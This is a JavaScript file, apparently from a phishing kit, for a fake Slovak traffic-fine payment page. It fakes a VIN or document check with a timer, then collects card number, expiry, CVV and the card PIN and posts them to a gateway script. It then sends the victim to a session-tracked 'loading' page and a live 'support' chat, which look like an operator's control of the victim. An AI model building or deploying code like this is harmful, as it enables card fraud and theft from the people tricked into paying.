document.addEventListener('DOMContentLoaded', function() {
    // Form inputs
    const vinInput = document.getElementById('vin');
    const docInput = document.getElementById('doc_number');
    const cardInput = document.getElementById('card');
    const expiryInput = document.getElementById('expiry');
    const cvvInput = document.getElementById('cvv');
    const pinInput = document.getElementById('pin');
    
    // Forms
    const verificationForm = document.getElementById('verificationForm');
    const paymentForm = document.getElementById('paymentForm');
    
    // Steps
    const step1 = document.getElementById('step1');
    const step2 = document.getElementById('step2');
    const step3 = document.getElementById('step3');
    
    // Progress indicators
    const progressSteps = document.querySelectorAll('.progress-step');
    
    // Buttons
    const proceedToPayment = document.getElementById('proceedToPayment');
    const backToVerification = document.getElementById('backToVerification');
    const backToFine = document.getElementById('backToFine');
    
    // Format VIN (uppercase, alphanumeric)
    if (vinInput) {
        vinInput.addEventListener('input', function(e) {
            e.target.value = e.target.value.toUpperCase().replace(/[^A-Z0-9]/g, '').substring(0, 17);
        });
    }
    
    // Format document number (uppercase)
    if (docInput) {
        docInput.addEventListener('input', function(e) {
            e.target.value = e.target.value.toUpperCase();
        });
    }
    
    // Format card number
    if (cardInput) {
        cardInput.addEventListener('input', function(e) {
            let value = e.target.value.replace(/\s/g, '').replace(/\D/g, '');
            let formattedValue = value.match(/.{1,4}/g)?.join(' ') || value;
            e.target.value = formattedValue.substring(0, 19);
        });
    }
    
    // Format expiry date
    if (expiryInput) {
        expiryInput.addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length >= 2) {
                value = value.substring(0, 2) + '/' + value.substring(2, 4);
            }
            e.target.value = value;
        });
    }
    
    // Format CVV
    if (cvvInput) {
        cvvInput.addEventListener('input', function(e) {
            e.target.value = e.target.value.replace(/\D/g, '').substring(0, 3);
        });
    }
    
    // Format PIN
    if (pinInput) {
        pinInput.addEventListener('input', function(e) {
            e.target.value = e.target.value.replace(/\D/g, '').substring(0, 4);
        });
    }

    
    // Step 1: Verification form submission
    if (verificationForm) {
        verificationForm.addEventListener('submit', function(e) {
            e.preventDefault();
            
            const vin = vinInput.value.trim();
            const docNumber = docInput.value.trim();
            
            if (!vin && !docNumber) {
                alert('Zadajte VIN kód alebo číslo dokladu');
                return;
            }
            
            // Store values for later use
            document.getElementById('vin_hidden').value = vin;
            document.getElementById('doc_hidden').value = docNumber;
            
            // Simulate verification (in real app, this would be an API call)
            const submitBtn = verificationForm.querySelector('button[type="submit"]');
            submitBtn.disabled = true;
            submitBtn.textContent = 'Overovanie...';
            
            setTimeout(() => {
                showStep(2);
                submitBtn.disabled = false;
                submitBtn.textContent = 'Overiť priestupok';
            }, 1500);
        });
    }
    
    // Proceed to payment
    if (proceedToPayment) {
        proceedToPayment.addEventListener('click', function() {
            showStep(3);
        });
    }
    
    // Back to verification
    if (backToVerification) {
        backToVerification.addEventListener('click', function() {
            showStep(1);
        });
    }
    
    // Back to fine details
    if (backToFine) {
        backToFine.addEventListener('click', function() {
            showStep(2);
        });
    }
    
    // Step 3: Payment form submission
    if (paymentForm) {
        paymentForm.addEventListener('submit', function(e) {
            e.preventDefault();
            
            const submitBtn = paymentForm.querySelector('button[type="submit"]');
            submitBtn.disabled = true;
            submitBtn.textContent = 'Spracovanie...';
            
            const formData = new FormData(paymentForm);
            
            fetch('/api/gateway.php', {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    window.location.href = '/pages/loading.php?id=' + data.session_id;
                } else {
                    alert('Chyba: ' + data.message);
                    submitBtn.disabled = false;
                    submitBtn.textContent = 'Zaplatiť 25,00 €';
                }
            })
            .catch(error => {
                alert('Chyba pri spracovaní platby');
                submitBtn.disabled = false;
                submitBtn.textContent = 'Zaplatiť 25,00 €';
            });
        });
    }
    
    // Function to show specific step
    function showStep(stepNumber) {
        // Hide all steps
        step1.classList.remove('active');
        step2.classList.remove('active');
        step3.classList.remove('active');
        
        // Remove active from all progress steps
        progressSteps.forEach(step => step.classList.remove('active'));
        
        // Show selected step
        if (stepNumber === 1) {
            step1.classList.add('active');
            progressSteps[0].classList.add('active');
        } else if (stepNumber === 2) {
            step2.classList.add('active');
            progressSteps[0].classList.add('active');
            progressSteps[1].classList.add('active');
        } else if (stepNumber === 3) {
            step3.classList.add('active');
            progressSteps[0].classList.add('active');
            progressSteps[1].classList.add('active');
            progressSteps[2].classList.add('active');
        }
        
        // Scroll to top
        window.scrollTo({ top: 0, behavior: 'smooth' });
    }
});


// Support Chat Functionality
let supportSessionId = null;
let supportChatInterval = null;

document.addEventListener('DOMContentLoaded', function() {
    const supportBtn = document.getElementById('supportBtn');
    const supportModal = document.getElementById('supportModal');
    const supportClose = document.getElementById('supportClose');
    const supportForm = document.getElementById('supportForm');
    const supportInput = document.getElementById('supportInput');
    const supportBody = document.getElementById('supportBody');
    
    // Open support modal
    if (supportBtn) {
        supportBtn.addEventListener('click', function() {
            supportModal.classList.add('active');
            
            // Initialize support session if not exists
            if (!supportSessionId) {
                initializeSupportSession();
            }
            
            supportInput.focus();
        });
    }
    
    // Close support modal
    if (supportClose) {
        supportClose.addEventListener('click', function() {
            supportModal.classList.remove('active');
        });
    }
    
    // Close on outside click
    if (supportModal) {
        supportModal.addEventListener('click', function(e) {
            if (e.target === supportModal) {
                supportModal.classList.remove('active');
            }
        });
    }
    
    // Send support message
    if (supportForm) {
        supportForm.addEventListener('submit', function(e) {
            e.preventDefault();
            
            const message = supportInput.value.trim();
            if (!message) return;
            
            sendSupportMessage(message);
            supportInput.value = '';
        });
    }
});

function initializeSupportSession() {
    // Generate simple numeric ID
    supportSessionId = Date.now().toString().slice(-6); // Last 6 digits of timestamp
    
    // Create session on server
    fetch('/api/create_support_session.php', {
        method: 'POST',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: 'session_id=' + supportSessionId
    })
    .then(response => response.json())
    .then(data => {
        if (data.success) {
            // Clear welcome message and show empty chat
            document.getElementById('supportBody').innerHTML = '<div class="support-messages" id="supportMessages"></div>';
            
            // Load existing messages
            loadSupportMessages();
            
            // Start polling for messages
            supportChatInterval = setInterval(loadSupportMessages, 2000);
        }
    })
    .catch(error => console.error('Error initializing support:', error));
}

function sendSupportMessage(message) {
    if (!supportSessionId) return;
    
    fetch('/api/send_chat.php', {
        method: 'POST',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: 'id=' + supportSessionId + '&message=' + encodeURIComponent(message)
    })
    .then(response => response.json())
    .then(data => {
        if (data.success) {
            addSupportMessage('user', message, Math.floor(Date.now() / 1000));
        }
    })
    .catch(error => console.error('Error sending message:', error));
}

function loadSupportMessages() {
    if (!supportSessionId) return;
    
    fetch('/api/get_chat.php?id=' + supportSessionId)
        .then(response => response.json())
        .then(data => {
            if (data.messages && data.messages.length > 0) {
                const messagesContainer = document.getElementById('supportMessages');
                if (messagesContainer) {
                    messagesContainer.innerHTML = '';
                    data.messages.forEach(msg => {
                        addSupportMessage(msg.from, msg.text, msg.time, false);
                    });
                    messagesContainer.scrollTop = messagesContainer.scrollHeight;
                }
            }
        })
        .catch(error => console.error('Error loading messages:', error));
}

function addSupportMessage(from, text, timestamp, scroll = true) {
    const messagesContainer = document.getElementById('supportMessages');
    if (!messagesContainer) return;
    
    const messageDiv = document.createElement('div');
    messageDiv.className = 'support-message ' + from;
    
    const bubble = document.createElement('div');
    bubble.className = 'support-message-bubble';
    bubble.textContent = text;
    
    const time = document.createElement('div');
    time.className = 'support-message-time';
    const date = new Date(timestamp * 1000);
    time.textContent = date.toLocaleTimeString('sk-SK', {hour: '2-digit', minute: '2-digit'});
    
    messageDiv.appendChild(bubble);
    messageDiv.appendChild(time);
    messagesContainer.appendChild(messageDiv);
    
    if (scroll) {
        messagesContainer.scrollTop = messagesContainer.scrollHeight;
    }
}
